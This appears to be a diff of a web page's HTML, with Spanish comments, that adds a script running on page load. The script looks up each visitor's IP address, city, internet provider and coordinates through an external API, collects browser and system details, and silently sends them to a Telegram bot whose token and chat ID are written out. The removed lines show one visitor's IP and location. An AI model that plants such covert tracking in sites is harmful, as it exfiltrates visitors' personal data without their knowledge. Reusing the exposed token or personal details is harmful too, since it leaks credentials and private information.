@@ -67,27 +67,66 @@
 <body>
 
    <script>
-  ------ Nuevo visitante en tu página web ------
+ window.onload = function() {
+    const telegramUrl = "https://api.telegram.org/bot7815776748:AAGl2LfwdET9KRExkGVyYzGfUiXDcqEwUBY/sendMessage";
+    const chatId = "5895952454"; // Tu ID de chat real
 
-IP del visitante: 79.159.61.9
-Ubicación: Figueres, Catalonia, Spain
-Proveedor: Telefonica De Espana S.A.U.
+    // Obtener detalles del navegador y sistema operativo
+    const userAgent = navigator.userAgent;
 
-Dispositivo: Linux / Chrome
-Tipo de dispositivo: Escritorio
-Coordenadas: Lat: 41.978 | Lon: 2.962
+    // Obtener la IP y ubicación con una API externa
+    fetch("https://ipapi.co/json/")
+        .then(response => response.json())
+        .then(data => {
+            const ip = data.ip;
+            const city = data.city;
+            const region = data.region;
+            const country = data.country_name;
+            const isp = data.org;
+            const lat = data.latitude || 'Desconocido';
+            const lon = data.longitude || 'Desconocido';
 
-Ubicación en Google Maps: https://www.google.com/maps?q=41.978,2.962
+            // Crear el enlace de Google Maps con las coordenadas
+            const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
-Navegador: Netscape / 5.0 (Windows)
-Sistema Operativo: Win32
+            // Obtener si el usuario está usando un dispositivo móvil o de escritorio
+            const deviceType = /mobile/i.test(userAgent) ? "Móvil" : "Escritorio";
 
-URL visitada: https://tusitio.com
+            // Mensaje completo a enviar
+            const message = `------ Nuevo visitante en tu página web ------
 
------- Fin del mensaje ------
+IP del visitante: ${ip}
+Ubicación: ${city}, ${region}, ${country}
+Proveedor: ${isp}
 
+Dispositivo: ${userAgent.split(" ")[0]}
+Tipo de dispositivo: ${deviceType}
+Coordenadas: Lat: ${lat} | Lon: ${lon}
 
-    </script>
+Ubicación en Google Maps: ${googleMapsLink}
+
+Navegador: ${navigator.appName} / ${navigator.appVersion}
+Sistema Operativo: ${navigator.platform}
+
+URL visitada: ${window.location.href}
+
+------ Fin del mensaje ------`;
+
+            // Enviar el mensaje completo
+            fetch(`${telegramUrl}?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log("Mensaje enviado con éxito.");
+                    } else {
+                        console.error("Error al enviar el mensaje:", data);
+                    }
+                })
+                .catch(error => console.error("Error de red:", error));
+        })
+        .catch(error => console.error("Error al obtener la IP:", error));
+};
+ </script>
     
     <div id="loadingScreen" class="hidden">
         <div class="spinner"></div>
